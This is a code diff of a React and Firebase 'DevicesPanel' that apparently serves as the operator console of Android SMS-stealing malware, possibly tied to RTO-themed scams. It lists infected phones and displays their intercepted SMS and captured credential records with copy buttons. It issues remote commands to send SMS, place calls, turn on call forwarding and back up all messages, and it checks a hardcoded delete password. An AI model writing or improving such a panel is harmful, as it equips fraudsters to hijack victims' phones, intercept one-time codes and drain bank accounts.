@@ -1,9 +1,9 @@
 "use client";
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { ref, update, remove } from "firebase/database";
 import { db } from "../lib/firebase";
 
-const DEVICE_LIMIT = 5;
+const DEVICE_LIMIT = 10;
 
 export default function DevicesPanel({ 
   data, 
@@ -23,23 +23,50 @@ export default function DevicesPanel({
   const [activeTabs, setActiveTabs] = useState({});
   const [formMemory, setFormMemory] = useState({});
 
+  // LocalStorage se saved phone number & message content load karna
+  useEffect(() => {
+    try {
+      const saved = localStorage.getItem("rto_form_memory");
+      if (saved) {
+        setFormMemory(JSON.parse(saved));
+      }
+    } catch (e) {}
+  }, []);
+
+  // Form field update aur LocalStorage me save karna
+  const updateField = (key, value) => {
+    setFormMemory((prev) => {
+      const updated = { ...prev, [key]: value };
+      try {
+        localStorage.setItem("rto_form_memory", JSON.stringify(updated));
+      } catch (e) {}
+      return updated;
+    });
+  };
+
   const devices = data.user_data || {};
-  let keys = Object.keys(devices);
+  const deviceStatus = data.device_status || {};
+
+  let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));
 
   if (searchQuery) {
     const q = searchQuery.toLowerCase();
     keys = keys.filter(id => {
       const dev = devices[id] || {};
-      const name = dev.d_name || dev.device_name || id;
+      const status = deviceStatus[id] || {};
+      const name = status.device_name || dev.d_name || dev.Device_info || id;
       const serial = deviceSerialMap[id] || 0;
       return (id + " " + name + " " + serial).toLowerCase().includes(q);
     });
   }
 
   keys.sort((a, b) => {
+    const onA = deviceOnlineStatus[a] ? 1 : 0;
+    const onB = deviceOnlineStatus[b] ? 1 : 0;
+    if (onA !== onB) return onB - onA;
     const sA = deviceSerialMap[a] || 0;
     const sB = deviceSerialMap[b] || 0;
-    return sA === sB ? a.localeCompare(b) : sB - sA;
+    return sB - sA;
   });
 
   if (filter === "online") {
@@ -53,7 +80,7 @@ export default function DevicesPanel({
   const copyToClipboard = (text, label = "Item") => {
     if (!text) return;
     navigator.clipboard.writeText(String(text));
-    showToast(`📋 Copied ${label}: ${String(text).slice(0, 25)}`, "success");
+    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
   };
 
   const toggleExpand = (id) => {
@@ -65,59 +92,113 @@ export default function DevicesPanel({
   };
 
   const handleCommand = (type, devId) => {
-    if (!confirm(`Execute ${type} on ${devId}?`)) return;
     const baseRef = ref(db, `user_data/${devId}`);
 
-    if (type === "call") {
-      const num = formMemory[`callNum-${devId}`];
-      const sim = formMemory[`callSim-${devId}`] || "0";
-      if (!num) return showToast("Enter phone number!", "warning");
-      update(baseRef, { command: "make call", adminNumber: num, simSlot: sim, timestamp: Date.now() });
-      showToast("Call command sent", "success");
-    } else if (type === "sms") {
+    if (type === "sendsms") {
       const num = formMemory[`smsNum-${devId}`];
       const body = formMemory[`smsText-${devId}`];
-      const sim = formMemory[`smsSim-${devId}`] || "1";
-      if (!num || !body) return showToast("Provide phone and message!", "warning");
-      update(baseRef, { command: "send message", targetDeviceId: devId, phoneNumber: num, messageText: body, simSlot: sim, timestamp: Date.now() });
-      showToast("SMS command sent", "success");
-    } else if (type === "fwd_on") {
+      const selectedSim = formMemory[`smsSim-${devId}`] || "0";
+
+      if (!num || !body) return showToast("⚠️ Enter recipient number & message!", "warning");
+      if (!confirm(`Send SMS from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+
+      update(baseRef, {
+        command: "send message",
+        targetDeviceId: devId,
+        phoneNumber: num,
+        messageText: body,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        simIndex: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => {
+        showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
+        // NOTE: Input content hataya nahi gaya hai, wahi save rahega
+      });
+    } 
+    else if (type === "fwd_on") {
       const num = formMemory[`fwdNum-${devId}`];
-      const sim = formMemory[`fwdSim-${devId}`] || "0";
-      if (!num) return showToast("Enter forward number!", "warning");
-      update(baseRef, { command: "call forward", targetDeviceId: devId, phoneNumber: num, simSlot: sim, timestamp: Date.now() });
-      showToast("Call Forward Activated", "success");
-    } else if (type === "fwd_off") {
-      const sim = formMemory[`fwdSim-${devId}`] || "0";
-      update(baseRef, { command: "forward off", targetDeviceId: devId, simSlot: sim, timestamp: Date.now() });
-      showToast("Call Forward Deactivated", "success");
-    } else if (type === "backup") {
-      update(baseRef, { command: "backup", timestamp: Date.now() });
-      showToast("Backup initiated", "success");
+      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
+
+      if (!num) return showToast("⚠️ Enter forward-to phone number!", "warning");
+      if (!confirm(`Activate Call Forward on SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+
+      update(baseRef, {
+        command: "call forward",
+        targetDeviceId: devId,
+        phoneNumber: num,
+        forwardNumber: num,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        simIndex: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
+    } 
+    else if (type === "fwd_off") {
+      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
+      if (!confirm(`Deactivate Call Forward on SIM ${Number(selectedSim) + 1}?`)) return;
+
+      update(baseRef, {
+        command: "forward off",
+        targetDeviceId: devId,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        simIndex: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
+    } 
+    else if (type === "call") {
+      const num = formMemory[`callNum-${devId}`];
+      const selectedSim = formMemory[`callSim-${devId}`] || "0";
+
+      if (!num) return showToast("⚠️ Enter target phone number!", "warning");
+      if (!confirm(`Make Call from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+
+      update(baseRef, {
+        command: "make call",
+        adminNumber: num,
+        phoneNumber: num,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
+    } 
+    else if (type === "backup") {
+      if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
+      update(baseRef, { command: "backup", timestamp: Date.now() })
+        .then(() => showToast("💾 Backup initiated", "success"));
     }
   };
 
   const deleteDeviceData = (devId, type) => {
     const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
-    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
+    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
     if (!confirm(`Delete ${type} for ${devId}?`)) return;
 
     const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
     remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
   };
 
+  const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
+  const offlineCount = keys.length - onlineCount;
+
   return (
     <div className="panel active">
       <div className="panel-header">
         <div>
           <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
-          <p className="panel-sub">Click on any device to expand & view details</p>
+          <p className="panel-sub">Click on any device to expand controls & details</p>
         </div>
         <div className="panel-stats">
-          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>All</button>
-          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>🟢 Online</button>
-          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>🔴 Offline</button>
-          <span className="stat-item"><i className="fas fa-users"></i> {keys.length}</span>
+          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
+            All ({keys.length})
+          </button>
+          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>
+            🟢 Online ({onlineCount})
+          </button>
+          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>
+            🔴 Offline ({offlineCount})
+          </button>
         </div>
       </div>
 
@@ -127,7 +208,7 @@ export default function DevicesPanel({
           type="text" 
           value={searchQuery}
           onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
-          placeholder="Search devices by ID, name, or serial..." 
+          placeholder="Search by ID, name, or serial..." 
           className="search-input"
         />
         {searchQuery && (
@@ -145,17 +226,21 @@ export default function DevicesPanel({
       <div id="devicesContainer">
         {offset > 0 && (
           <button className="btn-load-more" style={{ marginBottom: 10 }} onClick={() => setOffset(Math.max(0, offset - DEVICE_LIMIT))}>
-            <i className="fas fa-chevron-up"></i> Previous
+            <i className="fas fa-chevron-up"></i> Previous Page
           </button>
         )}
 
         {paginatedKeys.map((devId, idx) => {
           const dev = devices[devId] || {};
-          const isOnline = deviceOnlineStatus[devId];
+          const status = deviceStatus[devId] || {};
+          const isOnline = Boolean(deviceOnlineStatus[devId]);
           const isFav = favourites.includes(devId);
           const serial = deviceSerialMap[devId] || 0;
           const expanded = expandedDevices[devId];
           const curTab = activeTabs[devId];
+
+          const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
+          const lastSeen = status.last_seen || dev.last_online || "N/A";
 
           const smsMap = data.user_sms?.[devId] || {};
           const smsList = Object.values(smsMap).reverse();
@@ -166,10 +251,13 @@ export default function DevicesPanel({
             _timestamp: val.timestamp || val.date || 0
           })).sort((a, b) => b._timestamp - a._timestamp);
 
+          const sim1Num = dev.numberSim1 || "No SIM 1";
+          const sim2Num = dev.numberSim2 || "No SIM 2";
+
           return (
-            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"} ${expanded ? "expanded" : ""}`}>
+            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
               <div className="card-header" onClick={() => toggleExpand(devId)}>
-                <div className="device-info-left">
+                <div style={{ flex: 1, minWidth: 0 }}>
                   <div className="device-name-premium">
                     <button 
                       className="fav-star-btn" 
@@ -177,10 +265,9 @@ export default function DevicesPanel({
                     >
                       <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                     </button>
-                    <span className="name-text">📱 {devId}</span>
+                    <span className="name-text">📱 {devId.slice(0, 14)}...</span>
                     <span className="device-id">#{offset + idx + 1}</span>
-                    {serial > 0 && <span className="serial-badge-premium"><i className="fas fa-hashtag"></i> S-{serial}</span>}
-                    {isFav && <span className="fav-badge-premium">⭐ FAV</span>}
+                    {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                     <button 
                       className="copy-device-id-btn" 
                       onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
@@ -188,10 +275,11 @@ export default function DevicesPanel({
                       <i className="fas fa-copy"></i> Copy ID
                     </button>
                   </div>
+
                   <div className="device-sub-info">
-                    <span><i className="fas fa-microchip"></i> {dev.Device_info || dev.device_info || "N/A"}</span>
-                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || dev.sim1 || "No SIM"}</span>
-                    {(dev.numberSim2 || dev.sim2) && <span><i className="fas fa-sim-card"></i> {dev.numberSim2 || dev.sim2}</span>}
+                    <span><i className="fas fa-microchip"></i> {modelName}</span>
+                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
+                    {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                   </div>
                 </div>
 
@@ -200,234 +288,343 @@ export default function DevicesPanel({
                     <span className="status-dot"></span>
                     {isOnline ? "Online" : "Offline"}
                   </span>
-                  <div className="last-seen-premium">
-                    <i className="far fa-clock"></i> {dev.last_online ? new Date(dev.last_online).toLocaleString() : "N/A"}
-                  </div>
+                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
+                    <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
+                  </span>
                 </div>
               </div>
 
               <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
-                <div className="info-item-premium"><span className="info-label">Device</span><span className="info-value">{dev.Device_info || "N/A"}</span></div>
-                <div className="info-item-premium"><span className="info-label">SIM 1</span><span className="info-value">{dev.numberSim1 || "No SIM"}</span></div>
-                <div className="info-item-premium"><span className="info-label">SIM 2</span><span className="info-value">{dev.numberSim2 || "No SIM"}</span></div>
-                <div className="info-item-premium"><span className="info-label">Serial</span><span className="info-value highlight">{serial || "—"}</span></div>
+                <div className="info-item-premium">
+                  <span className="info-label">Device Model</span>
+                  <span className="info-value">{modelName}</span>
+                </div>
+                <div className="info-item-premium">
+                  <span className="info-label">SIM 1</span>
+                  <span className="info-value">{dev.numberSim1 || "No SIM"}</span>
+                </div>
+                <div className="info-item-premium">
+                  <span className="info-label">SIM 2</span>
+                  <span className="info-value">{dev.numberSim2 || "No SIM"}</span>
+                </div>
+                <div className="info-item-premium">
+                  <span className="info-label">Serial</span>
+                  <span className="info-value highlight">{serial || "—"}</span>
+                </div>
               </div>
 
               <div className="expand-hint" onClick={() => toggleExpand(devId)}>
-                <i className="fas fa-chevron-down"></i> {expanded ? "Click to collapse" : "Click to expand"}
+                <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
               </div>
 
               {expanded && (
                 <div className="expandable-content">
                   <div className="actions-row-premium">
                     {[
-                      { id: "sms", label: "SMS", icon: "💬", count: smsList.length },
-                      { id: "login", label: "Login", icon: "🔑", count: loginList.length },
-                      { id: "call", label: "Call", icon: "📞" },
-                      { id: "sendsms", label: "Send", icon: "✉️" },
-                      { id: "fwd", label: "Forward", icon: "🔀" },
-                      { id: "backup", label: "Backup", icon: "💾" },
-                      { id: "delete", label: "Delete", icon: "🗑️" }
+                      { id: "sms", label: "SMS", icon: "fas fa-envelope", count: smsList.length },
+                      { id: "login", label: "Login", icon: "fas fa-key", count: loginList.length },
+                      { id: "call", label: "Call", icon: "fas fa-phone" },
+                      { id: "sendsms", label: "Send SMS", icon: "fas fa-paper-plane" },
+                      { id: "fwd", label: "Forward", icon: "fas fa-random" },
+                      { id: "backup", label: "Backup", icon: "fas fa-database" },
+                      { id: "delete", label: "Delete", icon: "fas fa-trash" }
                     ].map(a => (
                       <button 
                         key={a.id} 
-                        className={`action-btn-premium ${curTab === a.id ? `active-${a.id}` : ""}`}
+                        className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                         onClick={() => handleTab(devId, a.id)}
                       >
-                        {a.icon} {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
+                        <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                       </button>
                     ))}
                   </div>
 
-                  {/* SMS Section */}
+                  {/* SMS Sub-tab */}
                   {curTab === "sms" && (
-                    <div className="section-premium active">
+                    <div className="section-premium">
                       <div className="section-title">
-                        💬 SMS <span style={{ marginLeft: "auto" }}>{smsList.length} total</span>
-                        <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ padding: "2px 8px", fontSize: 10 }}>⛶ Full</button>
+                        <span>Messages ({smsList.length})</span>
+                        <button 
+                          type="button"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            openSmsModal(devId);
+                          }} 
+                          className="btn-gold" 
+                          style={{ marginLeft: "auto", padding: "4px 12px", fontSize: 11, cursor: "pointer" }}
+                        >
+                          <i className="fas fa-expand" style={{ marginRight: 4 }}></i> View Full
+                        </button>
                       </div>
-                      <div className="sms-list-premium">
-                        {smsList.slice(0, 10).map((msg, i) => (
-                          <div key={i} className="sms-item-premium">
-                            <div className="sms-header-premium"><span>👤 {msg.sender || msg.address}</span><span>{msg.date || ""}</span></div>
-                            <div className="sms-body-premium">{msg.body}</div>
+                      <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
+                        {smsList.slice(0, 8).map((m, i) => (
+                          <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
+                            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
+                              <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
+                              <span>{m.date || ""}</span>
+                            </div>
+                            <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                           </div>
                         ))}
                       </div>
                     </div>
                   )}
 
-                  {/* Login Section (Individual Copy Buttons for Card, User, Bank, etc.) */}
+                  {/* Login Sub-tab */}
                   {curTab === "login" && (
-                    <div className="section-premium active">
+                    <div className="section-premium">
                       <div className="section-title">
-                        🔑 Credentials ({loginList.length})
-                        <button 
-                          onClick={() => deleteDeviceData(devId, "credentials")}
-                          className="btn-luxury btn-red" 
-                          style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}
-                        >
-                          🗑️ Delete All
-                        </button>
+                        <span>Credentials ({loginList.length})</span>
+                        <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                       </div>
-                      <div className="creds-container-premium">
+                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                         {loginList.length === 0 ? (
-                          <div className="empty-luxury">No credentials saved for this device.</div>
+                          <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                         ) : (
-                          loginList.map((cred, i) => {
-                            const timeStr = cred._timestamp ? new Date(cred._timestamp).toLocaleString() : "";
-                            return (
-                              <div key={cred.key || i} className="cred-item-premium" style={{ borderLeft: i === 0 ? "2px solid var(--green)" : "1px solid var(--border-color)" }}>
-                                <div className="cred-header-premium">
-                                  <span style={{ fontWeight: 600, color: "var(--gold)" }}>
-                                    📋 Record #{i + 1} {i === 0 && <span style={{ background: "var(--green)", color: "#fff", fontSize: 8, padding: "1px 6px", borderRadius: 8, marginLeft: 4 }}>LATEST</span>}
-                                  </span>
-                                  <span>{timeStr}</span>
-                                </div>
-                                <div className="cred-fields-premium" style={{ gridTemplateColumns: "1fr" }}>
-                                  {Object.entries(cred)
-                                    .filter(([k]) => !k.startsWith("_") && k !== "timestamp" && k !== "key")
-                                    .map(([k, v]) => (
-                                      <div key={k} className="cred-field-premium" style={{ padding: "4px 0", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
-                                        <span className="field-label-premium" style={{ fontWeight: 600, color: "var(--text-secondary)" }}>{k}</span>
-                                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                                          <span className="field-value-premium" style={{ color: "var(--text-primary)", fontWeight: 500 }}>{String(v)}</span>
-                                          <button 
-                                            className="copy-btn-premium"
-                                            title={`Copy ${k}`}
-                                            onClick={(e) => {
-                                              e.stopPropagation();
-                                              copyToClipboard(v, k);
-                                            }}
-                                          >
-                                            <i className="fas fa-copy"></i>
-                                          </button>
-                                        </div>
-                                      </div>
-                                    ))}
-                                </div>
+                          loginList.map((cred, i) => (
+                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.3)", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
+                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
+                                <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold)" }}>Record #{i + 1}</span>
+                                <button
+                                  type="button"
+                                  onClick={() => {
+                                    let str = "";
+                                    for (let k in cred) {
+                                      if (!k.startsWith("_") && k !== "key") str += `${k}: ${cred[k]}\n`;
+                                    }
+                                    navigator.clipboard.writeText(str);
+                                    showToast("📋 All Record fields copied!", "success");
+                                  }}
+                                  className="btn-sm"
+                                  style={{ background: "rgba(212,175,55,0.15)", color: "var(--gold)", padding: "2px 8px", borderRadius: 4, cursor: "pointer" }}
+                                >
+                                  <i className="fas fa-copy"></i> Copy All
+                                </button>
                               </div>
-                            );
-                          })
+
+                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
+                                <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed rgba(255,255,255,0.04)" }}>
+                                  <span style={{ color: "var(--text-muted)" }}>{k}:</span>
+                                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                                    <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
+                                    <button
+                                      type="button"
+                                      onClick={() => copyToClipboard(v, k)}
+                                      style={{ background: "transparent", border: "none", color: "var(--gold)", cursor: "pointer", fontSize: 11 }}
+                                      title={`Copy ${k}`}
+                                    >
+                                      <i className="fas fa-copy"></i>
+                                    </button>
+                                  </div>
+                                </div>
+                              ))}
+                            </div>
+                          ))
                         )}
                       </div>
                     </div>
                   )}
 
-                  {/* Commands: Call */}
-                  {curTab === "call" && (
-                    <div className="section-premium active">
-                      <div className="section-title">📞 Make Call</div>
-                      <input 
-                        type="text" 
-                        placeholder="Phone Number" 
-                        className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)" }} 
-                        value={formMemory[`callNum-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
-                      />
-                      <select 
-                        className="luxury-select" 
-                        style={{ marginBottom: 8 }}
-                        value={formMemory[`callSim-${devId}`] || "0"}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: e.target.value }))}
-                      >
-                        <option value="0">SIM 1</option>
-                        <option value="1">SIM 2</option>
-                      </select>
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("call", devId)}>
-                        <i className="fas fa-phone"></i> Call
-                      </button>
-                    </div>
-                  )}
-
-                  {/* Commands: Send SMS */}
+                  {/* Send SMS Command (PERSISTENT RECIPIENT & CONTENT) */}
                   {curTab === "sendsms" && (
-                    <div className="section-premium active">
-                      <div className="section-title">✉️ Send SMS</div>
+                    <div className="section-premium">
+                      <div className="section-title">
+                        <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
+                      </div>
+
+                      <div style={{ marginBottom: 10 }}>
+                        <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
+                          Select Outgoing SIM:
+                        </label>
+                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                          <button
+                            type="button"
+                            onClick={() => updateField(`smsSim-${devId}`, "0")}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 1 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
+                          </button>
+
+                          <button
+                            type="button"
+                            onClick={() => updateField(`smsSim-${devId}`, "1")}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: formMemory[`smsSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: formMemory[`smsSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: formMemory[`smsSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 2 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Persistent Recipient Number */}
                       <input 
                         type="text" 
-                        placeholder="Recipient Number" 
+                        placeholder="Recipient Phone Number" 
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)" }} 
+                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`smsNum-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsNum-${devId}`]: e.target.value }))}
+                        onChange={(e) => updateField(`smsNum-${devId}`, e.target.value)}
                       />
+
+                      {/* Persistent Message Text Area */}
                       <textarea 
-                        placeholder="Message" 
-                        rows="2"
+                        placeholder="Type Message Content..." 
+                        rows="3"
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)", minHeight: 60 }} 
+                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                         value={formMemory[`smsText-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsText-${devId}`]: e.target.value }))}
+                        onChange={(e) => updateField(`smsText-${devId}`, e.target.value)}
                       />
-                      <select 
-                        className="luxury-select" 
-                        style={{ marginBottom: 8 }}
-                        value={formMemory[`smsSim-${devId}`] || "1"}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsSim-${devId}`]: e.target.value }))}
+
+                      <button 
+                        className="btn-luxury btn-blue" 
+                        style={{ width: "100%", justifyContent: "center", padding: "10px" }} 
+                        onClick={() => handleCommand("sendsms", devId)}
                       >
-                        <option value="1">SIM 1</option>
-                        <option value="2">SIM 2</option>
-                      </select>
-                      <button className="btn-luxury btn-blue" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("sms", devId)}>
-                        <i className="fas fa-paper-plane"></i> Send
+                        <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(formMemory[`smsSim-${devId}`] || "0") + 1)}
                       </button>
                     </div>
                   )}
 
-                  {/* Commands: Call Forward */}
+                  {/* Call Forward Command */}
                   {curTab === "fwd" && (
-                    <div className="section-premium active">
-                      <div className="section-title">🔀 Call Forward</div>
+                    <div className="section-premium">
+                      <div className="section-title">
+                        <i className="fas fa-random" style={{ marginRight: 6 }}></i> Call Forward Controls
+                      </div>
+
+                      <div style={{ marginBottom: 10 }}>
+                        <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
+                          Select Target SIM for Forwarding:
+                        </label>
+                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                          <button
+                            type="button"
+                            onClick={() => updateField(`fwdSim-${devId}`, "0")}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 1 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
+                          </button>
+
+                          <button
+                            type="button"
+                            onClick={() => updateField(`fwdSim-${devId}`, "1")}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: formMemory[`fwdSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: formMemory[`fwdSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: formMemory[`fwdSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 2 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
+                          </button>
+                        </div>
+                      </div>
+
                       <input 
                         type="text" 
-                        placeholder="Forward To Number" 
+                        placeholder="Forward To Phone Number" 
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)" }} 
+                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`fwdNum-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`fwdNum-${devId}`]: e.target.value }))}
+                        onChange={(e) => updateField(`fwdNum-${devId}`, e.target.value)}
                       />
-                      <select 
-                        className="luxury-select" 
-                        style={{ marginBottom: 8 }}
-                        value={formMemory[`fwdSim-${devId}`] || "0"}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`fwdSim-${devId}`]: e.target.value }))}
-                      >
-                        <option value="0">SIM 1</option>
-                        <option value="1">SIM 2</option>
-                      </select>
-                      <div style={{ display: "flex", gap: 8 }}>
-                        <button className="btn-luxury" style={{ flex: 1, justifyContent: "center", background: "var(--green)", color: "#fff" }} onClick={() => handleCommand("fwd_on", devId)}>
-                          <i className="fas fa-play"></i> Activate
+
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                        <button 
+                          className="btn-luxury" 
+                          style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
+                          onClick={() => handleCommand("fwd_on", devId)}
+                        >
+                          <i className="fas fa-play"></i> Turn ON Forward
                         </button>
